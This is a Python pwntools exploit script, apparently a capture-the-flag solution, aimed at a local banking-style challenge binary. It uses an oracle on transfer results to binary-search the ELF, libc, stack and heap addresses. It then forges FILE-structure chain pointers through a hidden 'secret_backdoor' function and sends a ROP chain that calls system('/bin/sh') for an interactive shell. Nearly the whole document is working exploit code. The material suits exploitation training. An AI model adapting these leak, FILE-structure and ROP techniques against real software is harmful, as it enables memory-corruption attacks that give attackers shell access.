from pwn import *
from icecream import ic

elf = exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "debug"
# context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# b *transfer+334
b *secret_backdoor+69
b *leave
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, timeout=2)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def view_accounts():
    sla("> ", "1")

def open_account():
    sla("> ", "2")
    ru("is ")
    return rl().strip()

def brute_open(payload):
    while True:
        sla("> ", "2")
        test = ru("is ")
        ic(test)
        if test == b"":
            sl(payload)
            return
        else:
            val = rl().strip()
            close_account(val)


def close_account(account):
    sla("> ", "3")
    sa(":", account)

def deposit(account, amount):
    sla("> ", "4")
    sla(":", account)
    sla("?", str(amount))

def transfer(account1, account2, amount):
    sla("> ", "5")
    sa(":", account1)
    sa(":", account2)
    sla("?", amount)
    rl()
    data = rl().strip()
    ic(data)
    return data == b'Transfer successfully completed!'


def manager(passw):
    sla("> ", "6")
    sla(":", passw)

def search(top, bottom, elf_leek = False, libc_leek = False, stack_leek = False, heep_leek = False):
    acc2 = open_account()
    if heep_leek:
        accs = [open_account() for i in range(30)]
        close_account(accs.pop())
    while True:
        acc1 = open_account()
        if top == bottom:
            close_account(acc1)
            close_account(acc2)
            if heep_leek:
                for acc in accs:
                    close_account(acc)
            return top
        mid = (top + bottom) // 2
        ic(hex(mid))
        deposit(acc1, mid)
        if libc_leek:
            sl(b'a')
        if stack_leek:
            acc3 = open_account()
        if heep_leek:
            close_account(accs.pop())
        resp = transfer(acc1, acc2, "-")
        if resp == False:
            top = mid + 1
            ic("higher")
        else:
            ic("lower")
            bottom = mid
        if stack_leek:
            close_account(acc3)
        if heep_leek:
            accs.append(open_account())
        close_account(acc1)

elf.address = search(0x500000000000, 0x565555558000, elf_leek = True) - 0x1545

libc.address = search(0x7f0000000000, 0x800000000000, libc_leek = True) - libc.sym['puts'] - 0x1da

stack_address = search(0x7f0000000000, 0x800000000000, stack_leek = True) - 0x148

heap_address = search(0x500000000000, 0x665555558000, heep_leek = True) - 0x1000
heap_address = heap_address - (heap_address & 0xfff)

ic(hex(elf.address))
ic(hex(libc.address))
ic(hex(stack_address))
ic(hex(heap_address))


# *(u64*)prevchain=chain, (u64*)((u64)chain + 0xb8) = prevchain
payload = b'\x00'*0x8
payload += p64(heap_address + 0x4b0)        # chain
payload += p64(0)                           # file_no
payload += b'\x00'*0x10
payload += p64(elf.bss() + 0x100)           # lock (null ptr)
payload += b'\x00'*0x28
payload += p64(stack_address - 0x20)        # prevchain
payload += p64(0xffffffffffffffff)          # mode?

manager(hex(elf.sym['secret_backdoor'])[2:])
sl(payload)

payload = b'\x00'*0x500
payload += p64(qgad(libc, "rdi"))
payload += p64(binsh(libc))
payload += p64(libc.sym['system'])

brute_open(payload)

payload = b'\x00'*0x8
payload += p64(heap_address + 0x9a8)        # chain
payload += p64(3)                           # file_no
payload += b'\x00'*0x10
payload += p64(elf.bss() + 0x100)           # lock (null ptr)
payload += b'\x00'*0x28
payload += p64(stack_address - 0x20)        # prevchain
payload += p64(0xffffffffffffffff)          # mode?

manager(hex(elf.sym['secret_backdoor'])[2:])
sl(payload)

sl(b'7')

io.interactive()
